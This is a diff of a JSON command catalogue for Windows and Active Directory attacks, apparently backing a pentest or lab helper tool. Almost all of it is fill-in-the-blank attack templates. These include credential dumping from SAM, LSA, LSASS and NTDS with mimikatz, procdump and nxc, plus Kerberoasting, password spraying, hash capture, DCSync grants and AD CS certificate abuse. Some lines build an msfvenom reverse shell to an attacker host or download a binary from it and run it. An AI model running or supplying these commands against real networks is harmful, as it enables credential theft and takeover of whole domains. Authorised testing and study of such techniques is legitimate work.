@@ -105,7 +105,7 @@
       { "purpose": "As local admin: dump LSA secrets and cached domain logons", "template": "nxc smb {{TARGET}} -u <user> -p <pass> --lsa", "intent": "dump" },
       { "purpose": "As local admin: read logon secrets from LSASS remotely", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -M lsassy", "intent": "dump" },
       { "purpose": "As domain admin: dump NTDS from the DC", "template": "nxc smb {{TARGET}} -u <user> -p <pass> --ntds", "intent": "dump" },
-      { "purpose": "Run a command as local admin", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -x whoami", "intent": "enumerate" },
+      { "purpose": "Run a command as local admin", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -x whoami", "intent": "exploit" },
       { "purpose": "Check the DC for ZeroLogon (CVE-2020-1472); never exploit it on a shared lab", "template": "nxc smb {{TARGET}} -u '' -p '' -M zerologon", "intent": "enumerate" },
       { "purpose": "Check for noPac (CVE-2021-42278/42287)", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -M nopac", "intent": "enumerate" },
       { "purpose": "Check for PrintNightmare", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -M printnightmare", "intent": "enumerate" },
@@ -159,15 +159,15 @@
       { "purpose": "Take ownership of an object (WriteOwner)", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> set owner <user> <user>", "intent": "exploit" },
       { "purpose": "Add shadow credentials to a target", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> add shadowCredentials <user>", "intent": "exploit" },
       { "purpose": "Every object and attribute you can write", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> get writable --detail", "intent": "enumerate" },
-      { "purpose": "Targeted Kerberoast: give the user an SPN, then roast it", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> set object <user> servicePrincipalName -v 'slg/slg'", "intent": "enumerate" }
+      { "purpose": "Targeted Kerberoast: give the user an SPN, then roast it", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> set object <user> servicePrincipalName -v 'slg/slg'", "intent": "exploit" }
     ] },
     { "name": "certipy", "description": "AD Certificate Services enumeration and abuse tool", "commands": [
       { "purpose": "Find vulnerable, enabled templates", "template": "certipy find -u <user>@<domain> -p <pass> -dc-ip {{TARGET}} -vulnerable -enabled", "intent": "enumerate" },
       { "purpose": "Request an ESC1 cert as a DA via UPN", "template": "certipy req -u <user>@<domain> -p <pass> -dc-ip {{TARGET}} -ca '<ca>' -template '<template>' -upn administrator@<domain> -sid <sid>", "intent": "exploit" },
       { "purpose": "Authenticate with the PFX for the NT hash", "template": "certipy auth -pfx administrator.pfx -dc-ip {{TARGET}}", "intent": "authenticate" },
       { "purpose": "Shadow-credential a target to recover its hash", "template": "certipy shadow auto -u <user>@<domain> -p <pass> -account <user> -dc-ip {{TARGET}}", "intent": "exploit" },
-      { "purpose": "ESC4: rewrite a template you can edit into an ESC1 template", "template": "certipy template -u <user>@<domain> -p <pass> -dc-ip {{TARGET}} -template '<template>' -write-default-configuration", "intent": "enumerate" },
-      { "purpose": "ESC8: relay a coerced DC to the CA web enrollment", "template": "certipy relay -target 'http://<host>' -template DomainController", "intent": "enumerate" }
+      { "purpose": "ESC4: rewrite a template you can edit into an ESC1 template", "template": "certipy template -u <user>@<domain> -p <pass> -dc-ip {{TARGET}} -template '<template>' -write-default-configuration", "intent": "exploit" },
+      { "purpose": "ESC8: relay a coerced DC to the CA web enrollment", "template": "certipy relay -target 'http://<host>' -template DomainController", "intent": "exploit" }
     ] },
     { "name": "evil-winrm", "description": "WinRM shell supporting passwords, hashes and tickets", "commands": [
       { "purpose": "Kerberos login with the ticket in KRB5CCNAME (needs /etc/krb5.conf)", "template": "evil-winrm -i <host> -r <domain>", "intent": "authenticate" }
@@ -212,23 +212,13 @@
       { "purpose": "Installed 32-bit software and versions (drop Wow6432Node for 64-bit)", "template": "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | select DisplayName,DisplayVersion", "intent": "enumerate" }
     ] },
     { "name": "Enumerate privesc paths automatically", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": [], "when": "You want a fast, broad sweep of misconfigs before hand-checking anything; read winPEAS red/yellow first, then confirm each hit.", "tools": ["winpeas", "PowerUp", "PrivescCheck", "Seatbelt"], "commands": [
-      { "purpose": "Download and run winPEAS", "template": "curl http://{{LHOST}}/winPEASx64.exe -o w.exe & w.exe", "intent": "enumerate" },
-      { "purpose": "Run PowerUp's full check set", "template": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"", "intent": "enumerate" },
-      { "purpose": "Deep-check with PrivescCheck", "template": "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\"", "intent": "enumerate" }
     ] },
     { "name": "Get SYSTEM by abusing SeImpersonate", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "whoami /priv shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (common on service accounts and IIS/MSSQL).", "tools": ["PrintSpoofer", "GodPotato", "JuicyPotato", "JuicyPotatoNG", "SweetPotato"], "commands": [
-      { "purpose": "PrintSpoofer for 2016/2019/Win10", "template": "PrintSpoofer64.exe -i -c cmd", "intent": "exploit" },
-      { "purpose": "GodPotato for 2012-2022 when PrintSpoofer fails", "template": "GodPotato-NET4.exe -cmd \"cmd /c whoami\"", "intent": "exploit" }
     ] },
     { "name": "Read SAM and SYSTEM with SeBackupPrivilege", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["hash"], "when": "Your token has SeBackupPrivilege, which lets you read any file; grab the credential hives and parse them offline.", "tools": ["diskshadow", "robocopy", "reg", "impacket-secretsdump"], "commands": [
-      { "purpose": "Write the diskshadow script (PowerShell, one line per command)", "template": "Set-Content C:\\Windows\\Temp\\ds.txt \"set context persistent nowriters\",\"add volume c: alias slg\",\"create\",\"expose %slg% z:\"", "intent": "transfer" },
-      { "purpose": "Expose a shadow copy of C: as z:", "template": "diskshadow /s C:\\Windows\\Temp\\ds.txt", "intent": "dump" },
-      { "purpose": "On a DC: copy ntds.dit off the shadow copy (then secretsdump -ntds with system.save)", "template": "robocopy /b z:\\Windows\\NTDS . ntds.dit", "intent": "dump" },
-      { "purpose": "Or export the live hives", "template": "reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save", "intent": "dump" },
       { "purpose": "Extract local hashes offline", "template": "impacket-secretsdump -sam sam.save -system system.save LOCAL", "intent": "dump" }
     ] },
     { "name": "Abuse a dangerous token privilege", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "whoami /priv shows SeRestore, SeTakeOwnership, SeLoadDriver, SeDebug or SeManageVolume; each is a note-level path to SYSTEM.", "tools": ["icacls", "procdump"], "commands": [
-      { "purpose": "Take ownership/rewrite a SYSTEM binary", "template": "icacls <file> /grant <user>:F", "intent": "exploit" },
       { "purpose": "SeTakeOwnership: own the file, then icacls grants you full control", "template": "takeown /f <file>", "intent": "exploit" }
     ] },
     { "name": "Abuse a privileged built-in group", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "whoami /groups shows Backup Operators, Server Operators, DnsAdmins or AD Recycle Bin: each one is a short path to SYSTEM or old secrets.", "tools": ["impacket-reg", "sc"], "commands": [
@@ -241,16 +231,13 @@
     { "name": "Hijack an unquoted service path", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "A service runs an unquoted path containing spaces and you can write to an earlier segment; Windows will run your C:\\Program.exe first.", "tools": ["sc", "icacls"], "commands": [
       { "purpose": "List service binary paths", "template": "wmic service get name,displayname,pathname,startmode", "intent": "enumerate" },
       { "purpose": "PowerShell: unquoted paths with spaces (no wmic on Win11 24H2 / Server 2025)", "template": "Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '^\"' -and $_.PathName -match ' ' } | select Name,PathName,StartMode", "intent": "enumerate" },
-      { "purpose": "Check write access on an intermediate folder", "template": "icacls \"C:\\Program Files\\<file>\"", "intent": "enumerate" },
-      { "purpose": "Confirm the service account", "template": "sc qc <service>", "intent": "enumerate" }
+      { "purpose": "Check write access on an intermediate folder", "template": "icacls \"C:\\Program Files\\<file>\"", "intent": "enumerate" }
     ] },
     { "name": "Replace a weak service binary", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "You have write access to the exe of a service that runs as SYSTEM; swap it and restart the service.", "tools": ["icacls", "sc"], "commands": [
-      { "purpose": "Check write access on the service exe", "template": "icacls \"C:\\Path\\service.exe\"", "intent": "enumerate" },
       { "purpose": "On Kali: a service exe (a plain exe is killed by the SCM after 30 s)", "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe-service -o svc.exe", "intent": "exploit" },
       { "purpose": "Replace the binary and restart", "template": "sc stop <service> & copy /y svc.exe \"C:\\Path\\service.exe\" & sc start <service>", "intent": "exploit" }
     ] },
     { "name": "Reconfigure a service with weak permissions", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "You hold SERVICE_CHANGE_CONFIG on a LocalSystem service; rewrite its binPath to run your command.", "tools": ["accesschk", "sc"], "commands": [
-      { "purpose": "Find services the user can modify", "template": "accesschk.exe -accepteula -uwcqv <user> *", "intent": "enumerate" },
       { "purpose": "On Kali: a service exe (a plain exe is killed by the SCM after 30 s)", "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe-service -o svc.exe", "intent": "exploit" },
       { "purpose": "Point binPath at your binary and restart", "template": "sc config <service> binPath= \"C:\\Temp\\svc.exe\" & sc stop <service> & sc start <service>", "intent": "exploit" }
     ] },
@@ -259,7 +246,6 @@
       { "purpose": "Check a service for a writable/missing DLL", "template": "icacls \"C:\\Path\\plugin.dll\"", "intent": "enumerate" }
     ] },
     { "name": "Hijack a writable scheduled-task binary", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "A scheduled task runs as SYSTEM or another user and its script/binary is writable by you; overwrite it before the next run.", "tools": ["schtasks", "icacls"], "commands": [
-      { "purpose": "List tasks, run-as user and action", "template": "schtasks /query /fo LIST /v", "intent": "enumerate" },
       { "purpose": "Check write access on the task binary", "template": "icacls \"C:\\Scripts\\task.bat\"", "intent": "enumerate" }
     ] },
     { "name": "Install an MSI as SYSTEM via AlwaysInstallElevated", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "Both AlwaysInstallElevated keys are set to 1, so any MSI installs with SYSTEM rights.", "tools": ["reg"], "commands": [
@@ -268,18 +254,14 @@
       { "purpose": "Install it as SYSTEM", "template": "msiexec /quiet /qn /i evil.msi", "intent": "exploit" }
     ] },
     { "name": "Run as another user with found or saved credentials", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "You found a password for another local or domain user, or cmdkey /list shows saved ones, and need a process running as them.", "tools": ["cmdkey","runas","RunasCs"], "commands": [
-      { "purpose": "List stored credentials", "template": "cmdkey /list", "intent": "dump" },
-      { "purpose": "Reuse them with runas", "template": "runas /savecred /user:<domain>\\<user> \"cmd /c whoami\"", "intent": "exploit" }
     ] },
     { "name": "Hijack a writable folder in the system PATH", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "A folder in the machine PATH is writable by you and a SYSTEM service or task loads a missing DLL or runs a program by bare name.", "tools": ["icacls"], "commands": [
       { "purpose": "Machine PATH folders", "template": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path", "intent": "enumerate" },
       { "purpose": "Check each folder: (F), (M) or (W) for you, Users or Everyone means writable", "template": "icacls \"<path>\"", "intent": "enumerate" }
     ] },
     { "name": "Hunt stored credentials on disk and registry", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["creds"], "when": "You want quick wins from leftover secrets in config files, answer files, history and the registry.", "tools": ["findstr", "reg", "LaZagne"], "commands": [
-      { "purpose": "Grep config files for passwords", "template": "findstr /sim password *.xml *.ini *.config *.txt", "intent": "dump" },
       { "purpose": "Check unattend/sysprep answer files", "template": "type C:\\Windows\\Panther\\Unattend.xml", "intent": "dump" },
       { "purpose": "Read PowerShell history", "template": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "intent": "dump" },
-      { "purpose": "Check registry autologon (also Vault, RDP, Putty, Credential Manager)", "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "intent": "dump" },
       { "purpose": "Saved PuTTY sessions (proxy passwords, hosts)", "template": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s", "intent": "dump" },
       { "purpose": "Every registry value containing password", "template": "reg query HKLM /f password /t REG_SZ /s", "intent": "dump" },
       { "purpose": "PowerShell history of this session and the file on disk", "template": "Get-History; (Get-PSReadlineOption).HistorySavePath", "intent": "dump" },
@@ -298,39 +280,30 @@
       { "purpose": "Check write access on startup items", "template": "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"", "intent": "enumerate" }
     ] },
     { "name": "Find a kernel or software exploit from the build", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "Config checks come up empty and the box is old/unpatched; match the build and hotfixes to public CVEs (names only, run a known-good PoC in the lab).", "tools": ["wesng"], "commands": [
-      { "purpose": "Save systeminfo and suggest patches", "template": "systeminfo > systeminfo.txt & wes.py systeminfo.txt", "intent": "enumerate" },
-      { "purpose": "Update the WES database first", "template": "wes.py --update", "intent": "tune" }
+      { "purpose": "Save systeminfo and suggest patches", "template": "systeminfo > systeminfo.txt & wes.py systeminfo.txt", "intent": "enumerate" }
     ] },
-    { "name": "Dump local secrets once you are admin", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["admin"], "yields": ["hash"], "when": "You just got SYSTEM/admin and want local hashes, cached domain creds and LSA secrets for reuse.", "tools": ["reg", "impacket-secretsdump", "mimikatz", "procdump", "pypykatz", "nxc"], "commands": [
+    { "name": "Dump local secrets once you are admin", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["admin"], "yields": ["hash"], "when": "You just got SYSTEM/admin and want local hashes, cached domain creds and LSA secrets for reuse.", "tools": ["reg", "impacket-secretsdump", "mimikatz", "procdump", "pypykatz"], "commands": [
       { "purpose": "Save all three hives", "template": "reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save & reg save HKLM\\SECURITY security.save", "intent": "dump" },
-      { "purpose": "Parse them offline", "template": "impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL", "intent": "dump" },
-      { "purpose": "Or pull live creds with mimikatz", "template": ".\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"", "intent": "dump" },
-      { "purpose": "Dump LSASS for offline parsing (Defender flags this; comsvcs.dll MiniDump is the LOLBin note)", "template": "procdump.exe -accepteula -ma lsass.exe lsass.dmp", "intent": "dump" }
+      { "purpose": "Remote SAM dump with nxc", "template": "nxc smb {{TARGET}} -u <user> -p <pass> --sam", "intent": "dump" },
+      { "purpose": "Remote LSA secrets and cached logons with nxc", "template": "nxc smb {{TARGET}} -u <user> -p <pass> --lsa", "intent": "dump" },
+      { "purpose": "Remote LSASS secrets with nxc", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -M lsassy", "intent": "dump" }
     ] },
     { "name": "Enumerate the domain with no credentials", "phase": "Recon", "service": "ldap", "applies": "ad", "needs": [], "yields": [], "when": "Port 88 is open (a domain controller) but you have no account yet: note the domain and DC name, then pull users and policy from anonymous channels.", "tools": ["nmap", "ldapsearch", "rpcclient", "nxc", "impacket-lookupsid", "impacket-samrdump", "impacket-DumpNTLMInfo"], "commands": [
-      { "purpose": "Scan the DC for AD services", "template": "nmap -p 53,88,135,139,389,445,464,636,3268,5985 -sV {{TARGET}}", "intent": "enumerate" },
-      { "purpose": "Domain, DC hostname and SMB signing in one line", "template": "nxc smb {{TARGET}}", "intent": "enumerate" },
-      { "purpose": "Query the directory anonymously", "template": "ldapsearch -x -H ldap://{{TARGET}} -b \"DC=<domain>,DC=<dc>\"", "intent": "enumerate" },
-      { "purpose": "Try a null session for users", "template": "rpcclient -U \"\" -N {{TARGET}} -c enumdomusers", "intent": "enumerate" },
-      { "purpose": "RID-brute users over SMB", "template": "nxc smb {{TARGET}} -u '' -p '' --rid-brute", "intent": "enumerate" }
     ] },
     { "name": "Enumerate valid domain usernames", "phase": "Recon", "service": "kerberos", "applies": "ad", "needs": [], "yields": [], "when": "You need a confirmed user list before spraying or AS-REP roasting; Kerberos pre-auth leaks which names exist quietly.", "tools": ["kerbrute", "exiftool"], "commands": [
-      { "purpose": "Test a username wordlist against the DC", "template": "kerbrute userenum -d <domain> --dc {{TARGET}} users.txt", "intent": "enumerate" }
     ] },
-    { "name": "Use Kerberos from Kali", "phase": "Recon", "service": "kerberos", "applies": "ad", "needs": [], "yields": [], "when": "Kerberos tools fail with KRB_AP_ERR_SKEW or 'server not found', or NTLM is off and you must log in with a ticket.", "tools": ["evil-winrm", "nxc"], "commands": [
+    { "name": "Use Kerberos from Kali", "phase": "Recon", "service": "kerberos", "applies": "ad", "needs": [], "yields": [], "when": "Kerberos tools fail with KRB_AP_ERR_SKEW or 'server not found', or NTLM is off and you must log in with a ticket.", "tools": ["evil-winrm"], "commands": [
       { "purpose": "Sync your clock to the DC (stop NTP from undoing it)", "template": "sudo timedatectl set-ntp off && sudo ntpdate {{TARGET}}", "intent": "tune" },
       { "purpose": "Or run one command with the DC's time", "template": "faketime \"$(ntpdate -q {{TARGET}} | cut -d ' ' -f 1,2)\" <command>", "intent": "tune" },
       { "purpose": "Write a krb5.conf for the domain and install it", "template": "nxc smb {{TARGET}} --generate-krb5-file krb5.conf && sudo cp krb5.conf /etc/krb5.conf", "intent": "tune" },
-      { "purpose": "Use a saved ticket: point KRB5CCNAME at it and name the host, not the IP", "template": "export KRB5CCNAME=<file>.ccache; impacket-psexec -k -no-pass <domain>/<user>@<host>", "intent": "authenticate" }
+      { "purpose": "Use a saved ticket: point KRB5CCNAME at it and name the host, not the IP", "template": "export KRB5CCNAME=<file>.ccache; impacket-psexec -k -no-pass <domain>/<user>@<host>", "intent": "authenticate" },
+      { "purpose": "nxc with Kerberos instead of NTLM", "template": "nxc smb <host> -u <user> -p <pass> -k", "intent": "authenticate" },
+      { "purpose": "nxc with the ticket in KRB5CCNAME", "template": "export KRB5CCNAME=<file>.ccache; nxc smb <host> --use-kcache", "intent": "authenticate" }
     ] },
-    { "name": "AS-REP roast users without pre-auth", "phase": "Initial Access", "service": "kerberos", "applies": "ad", "needs": [], "yields": ["hash"], "when": "Any account with 'do not require pre-auth' hands you a crackable hash with no credentials at all.", "tools": ["impacket-GetNPUsers", "hashcat", "nxc"], "commands": [
-      { "purpose": "Request AS-REP for a user list", "template": "impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip {{TARGET}} -no-pass -format hashcat", "intent": "dump" },
-      { "purpose": "Crack the AS-REP hash", "template": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt", "intent": "exploit" }
+    { "name": "AS-REP roast users without pre-auth", "phase": "Initial Access", "service": "kerberos", "applies": "ad", "needs": [], "yields": ["hash"], "when": "Any account with 'do not require pre-auth' hands you a crackable hash with no credentials at all.", "tools": ["impacket-GetNPUsers", "hashcat"], "commands": [
+      { "purpose": "Or with nxc over LDAP", "template": "nxc ldap {{TARGET}} -u <user> -p <pass> --asreproast asrep.hash", "intent": "dump" }
     ] },
     { "name": "Poison LLMNR/NBT-NS to capture hashes", "phase": "Initial Access", "service": "smb", "applies": "ad", "needs": [], "yields": ["hash"], "when": "You are on the internal subnet; answer broadcast name lookups to capture NetNTLMv2, then crack or relay it.", "tools": ["Responder", "hashcat", "nxc", "impacket-ntlmrelayx"], "commands": [
-      { "purpose": "Poison name resolution on the wire", "template": "responder -I tun0", "intent": "dump" },
-      { "purpose": "Crack the captured NetNTLMv2", "template": "hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt", "intent": "exploit" },
-      { "purpose": "List relay targets (SMB signing off); relay with ntlmrelayx when the victim is admin elsewhere", "template": "nxc smb <range> --gen-relay-list relay.txt", "intent": "enumerate" }
     ] },
     { "name": "MSSQL command execution and hash capture", "phase": "Initial Access", "service": "mssql", "applies": "windows", "needs": ["creds"], "yields": ["shell","hash"], "when": "You can log in to MSSQL: run OS commands through xp_cmdshell, or make the server connect to you to catch its service account hash.", "tools": ["impacket-mssqlclient","Responder"], "commands": [
       { "purpose": "In mssqlclient: turn on xp_cmdshell (needs sysadmin)", "template": "enable_xp_cmdshell", "intent": "exploit" },
@@ -342,52 +315,31 @@
       { "purpose": "In mssqlclient: impersonate sa when enum_impersonate allows it", "template": "exec_as_login sa", "intent": "exploit" }
     ] },
     { "name": "Spray passwords across the domain", "phase": "Initial Access", "service": "smb", "applies": "ad", "needs": [], "yields": ["domain creds"], "when": "You have a user list and want a first valid login; check the lockout policy first so you do not lock accounts.", "tools": ["nxc","kerbrute"], "commands": [
-      { "purpose": "Check the lockout policy first (null session; add creds if refused)", "template": "nxc smb {{TARGET}} -u '' -p '' --pass-pol", "intent": "enumerate" },
-      { "purpose": "Spray one password with nxc", "template": "nxc smb {{TARGET}} -u users.txt -p '<pass>' --continue-on-success", "intent": "authenticate" },
-      { "purpose": "Or spray over Kerberos", "template": "kerbrute passwordspray -d <domain> --dc {{TARGET}} users.txt '<pass>'", "intent": "authenticate" }
+      { "purpose": "Check the lockout policy first (null session; add creds if refused)", "template": "nxc smb {{TARGET}} -u '' -p '' --pass-pol", "intent": "enumerate" }
     ] },
-    { "name": "Map AD attack paths", "phase": "Recon", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": [], "when": "You have any domain account and want the shortest path to Domain Admin; collect, then ask it the right questions.", "tools": ["bloodhound-python", "nxc", "bloodhound-ce-python", "SharpHound", "bloodyAD"], "commands": [
-      { "purpose": "Collect everything remotely for legacy BloodHound (CE needs bloodhound-ce-python)", "template": "bloodhound-python -d <domain> -u <user> -p <pass> -ns {{TARGET}} -c All --zip", "intent": "enumerate" }
+    { "name": "Map AD attack paths", "phase": "Recon", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": [], "when": "You have any domain account and want the shortest path to Domain Admin; collect, then ask it the right questions.", "tools": ["bloodhound-python", "bloodhound-ce-python", "SharpHound", "bloodyAD"], "commands": [
+      { "purpose": "Or collect with nxc over LDAP", "template": "nxc ldap {{TARGET}} -u <user> -p <pass> --bloodhound -c All --dns-server {{TARGET}}", "intent": "enumerate" }
     ] },
     { "name": "Enumerate the domain with credentials", "phase": "Recon", "service": "smb", "applies": "ad", "needs": ["domain creds"], "yields": [], "when": "With a valid account, inventory shares, users, groups, sessions and files before choosing an escalation path.", "tools": ["nxc", "ldapdomaindump", "impacket-GetADUsers"], "commands": [
-      { "purpose": "List shares, users, groups and sessions", "template": "nxc smb {{TARGET}} -u <user> -p <pass> --shares --users --groups --loggedon-users", "intent": "enumerate" },
-      { "purpose": "Spider readable shares for files", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -M spider_plus", "intent": "dump" },
-      { "purpose": "Dump the directory to HTML/JSON", "template": "ldapdomaindump -u '<domain>\\<user>' -p <pass> {{TARGET}}", "intent": "enumerate" }
+      { "purpose": "List shares, users, groups and sessions", "template": "nxc smb {{TARGET}} -u <user> -p <pass> --shares --users --groups --loggedon-users", "intent": "enumerate" }
     ] },
     { "name": "Enumerate the domain from a joined host", "phase": "Recon", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": [], "when": "You have a foothold on a domain-joined Windows host and want AD data without a Kali LDAP route; watch description fields for passwords.", "tools": ["PowerView", "Snaffler"], "commands": [
-      { "purpose": "Enumerate users and read descriptions", "template": "Get-DomainUser | select samaccountname,description", "intent": "enumerate" },
-      { "purpose": "List members of a target group", "template": "Get-DomainGroupMember '<group>'", "intent": "enumerate" },
-      { "purpose": "Find where your account is local admin", "template": "Find-LocalAdminAccess", "intent": "enumerate" }
     ] },
-    { "name": "Kerberoast service accounts", "phase": "PrivEsc", "service": "kerberos", "applies": "ad", "needs": ["domain creds"], "yields": ["hash"], "when": "Any domain user can request TGS tickets for accounts with an SPN; crack them offline for the service password.", "tools": ["impacket-GetUserSPNs", "Rubeus", "hashcat", "nxc"], "commands": [
-      { "purpose": "Request hashes for all SPN accounts", "template": "impacket-GetUserSPNs -dc-ip {{TARGET}} <domain>/<user>:<pass> -request", "intent": "dump" },
-      { "purpose": "Or roast from a Windows foothold", "template": "Rubeus.exe kerberoast /outfile:hashes.txt", "intent": "dump" },
-      { "purpose": "Crack the TGS hash", "template": "hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt", "intent": "exploit" }
+    { "name": "Kerberoast service accounts", "phase": "PrivEsc", "service": "kerberos", "applies": "ad", "needs": ["domain creds"], "yields": ["hash"], "when": "Any domain user can request TGS tickets for accounts with an SPN; crack them offline for the service password.", "tools": ["impacket-GetUserSPNs", "Rubeus", "hashcat"], "commands": [
+      { "purpose": "Or with nxc over LDAP", "template": "nxc ldap {{TARGET}} -u <user> -p <pass> --kerberoasting spn.hash", "intent": "dump" }
     ] },
     { "name": "Loot GPP and SYSVOL passwords", "phase": "Recon", "service": "smb", "applies": "ad", "needs": ["domain creds"], "yields": ["domain creds"], "when": "Legacy Group Policy Preferences stored an AES-encrypted cpassword whose key is public; also grep SYSVOL scripts and shares.", "tools": ["nxc", "gpp-decrypt", "impacket-Get-GPPPassword"], "commands": [
-      { "purpose": "Pull cpasswords from SYSVOL", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -M gpp_password", "intent": "dump" },
-      { "purpose": "Decrypt a cpassword by hand", "template": "gpp-decrypt <pass>", "intent": "exploit" }
+      { "purpose": "Pull cpasswords from SYSVOL", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -M gpp_password", "intent": "dump" }
     ] },
     { "name": "Take over a user via GenericAll", "phase": "PrivEsc", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": ["domain creds"], "when": "BloodHound shows GenericAll/GenericWrite/ForceChangePassword over a user; reset their password or Kerberoast them on the fly.", "tools": ["bloodyAD", "PowerView", "impacket-dacledit", "impacket-changepasswd"], "commands": [
-      { "purpose": "Reset the target's password", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> set password <user> '<pass>'", "intent": "exploit" },
-      { "purpose": "Or set an SPN for targeted Kerberoast instead", "template": "Set-DomainObject -Identity <user> -Set @{serviceprincipalname='<spn>'}", "intent": "exploit" }
     ] },
     { "name": "Add yourself to a privileged group", "phase": "PrivEsc", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": [], "when": "You have GenericWrite/WriteDACL over a group that leads (possibly nested) to Domain Admins; self-add, then clean up afterwards.", "tools": ["bloodyAD", "PowerView"], "commands": [
-      { "purpose": "Add your user to the group", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> add groupMember <group> <user>", "intent": "exploit" },
-      { "purpose": "Or from a Windows host with PowerView", "template": "Add-DomainGroupMember -Identity '<group>' -Members <user>", "intent": "exploit" }
     ] },
     { "name": "Grant yourself DCSync via WriteOwner/WriteDACL", "phase": "PrivEsc", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": [], "when": "You own or can write the DACL of the domain head; take ownership, then grant yourself replication rights for DCSync.", "tools": ["bloodyAD", "impacket-owneredit", "impacket-dacledit"], "commands": [
-      { "purpose": "Take ownership of the domain object", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> set owner <domain> <user>", "intent": "exploit" },
-      { "purpose": "Grant yourself DCSync rights", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> add dcsync <user>", "intent": "exploit" }
     ] },
     { "name": "Take over an account with shadow credentials", "phase": "PrivEsc", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": ["hash"], "when": "You have GenericWrite over a target and the domain has AD CS/PKINIT; add a KeyCredentialLink and authenticate as them (pyWhisker is the alternative, note).", "tools": ["certipy", "bloodyAD"], "commands": [
-      { "purpose": "Add a KeyCredential and recover the NT hash", "template": "certipy shadow auto -u <user>@<domain> -p <pass> -account <user> -dc-ip {{TARGET}}", "intent": "exploit" },
-      { "purpose": "Or add the shadow credential with bloodyAD", "template": "bloodyAD --host {{TARGET}} -d <domain> -u <user> -p <pass> add shadowCredentials <user>", "intent": "exploit" }
     ] },
     { "name": "Abuse a vulnerable AD CS template (ESC1)", "phase": "PrivEsc", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": ["hash"], "when": "certipy flags a template with EnrolleeSuppliesSubject and a client-auth EKU; request a cert as a DA, then auth for their hash (ESC8 relays NTLM to web enrollment, note).", "tools": ["certipy"], "commands": [
-      { "purpose": "Find vulnerable, enabled templates", "template": "certipy find -u <user>@<domain> -p <pass> -dc-ip {{TARGET}} -vulnerable -enabled", "intent": "enumerate" },
-      { "purpose": "Request a cert as a DA via UPN", "template": "certipy req -u <user>@<domain> -p <pass> -dc-ip {{TARGET}} -ca '<ca>' -template '<template>' -upn administrator@<domain> -sid <sid>", "intent": "exploit" },
